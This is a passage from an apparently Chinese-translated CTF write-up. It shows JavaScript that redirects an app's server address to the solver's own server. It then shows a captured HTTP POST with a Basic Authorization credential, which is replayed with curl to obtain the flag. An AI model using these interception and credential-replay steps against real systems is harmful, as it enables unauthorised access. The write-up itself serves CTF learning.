lw lx ly lz aw ma bi"><span id="6831" class="mb ku iq lx b gy mc md l me mf">if (str.indexOf("188.166.76.14:42151") &gt; 0) {<br/>            str = str.replace("188.166.76.14:42151", "<strong class="lx ir">[MyServerIP]:80</strong>")<br/>        }</span></pre><p id="3cf2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">令人惊讶的是，我看到了下面的HTTP请求:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="62fe" class="mb ku iq lx b gy mc md l me mf">POST /<strong class="lx ir">DBdwGcbFDApx93J3</strong> HTTP/1.1<br/>Host: 185.236.76.59<br/>Connection: keep-alive<br/>User-Agent: python-requests/2.20.1<br/>Accept: */*<br/>Accept-Encoding: gzip, deflate<br/>Content-Length: 42<br/>Content-Type: application/x-www-form-urlencoded<br/><strong class="lx ir">Authorization: Basic YmlnYnJvdGhlcjo0UWozcmM0WmhOUUt2N1J6</strong></span><span id="4281" class="mb ku iq lx b gy mg md l me mf">username=alfredo&amp;deviceId=3d8b0f8219c4b301</span></pre><p id="b74d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">立即:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="5ca0" class="mb ku iq lx b gy mc md l me mf"><strong class="lx ir">curl -v </strong><a class="ae my" href="http://188.166.76.14:42151/DBdwGcbFDApx93J3" rel="noopener ugc nofollow" target="_blank"><strong class="lx ir">http://188.166.76.14:42151/DBdwGcbFDApx93J3</strong></a><strong class="lx ir"> -d "username=alfredo&amp;deviceId=3d8b0f8219c4b301" --insecure -H "Authorization: Basic YmlnYnJvdGhlcjo0UWozcmM0WmhOUUt2N1J6"</strong><br/>*   Trying 188.166.76.14...<br/>* TCP_NODELAY set<br/>* Connected to 188.166.76.14 (188.166.76.14) port 42151 (#0)<br/>&gt; POST /DBdwGcbFDApx93J3 HTTP/1.1<br/>&gt; Host: 188.166.76.14:42151<br/>&gt; User-Agent: curl/7.61.1<br/>&gt; Accept: */*<br/>&gt; Authorization: Basic YmlnYnJvdGhlcjo0UWozcmM0WmhOUUt2N1J6<br/>&gt; Content-Length: 42<br/>&gt; Content-Type: application/x-www-form-urlencoded<br/>&gt; <br/>* upload completely sent off: 42 out of 42 bytes<br/>&lt; HTTP/1.1 200 OK<br/>&lt; Server: gunicorn/19.9.0<br/>&lt; Date: Sun, 25 Nov 2018 15:39:56 GMT<br/>&lt; Connection: close<br/>&lt; Content-Type: text/html; charset=utf-8<br/>&lt; Content-Length: 32<br/>&lt; <br/>* Closing connection 0<br/><strong class="lx ir">ASIS{0Ld_B16_br0Th3r_H4d_a_F4rm}</strong></span></pre></div></div>    
</body>
</html>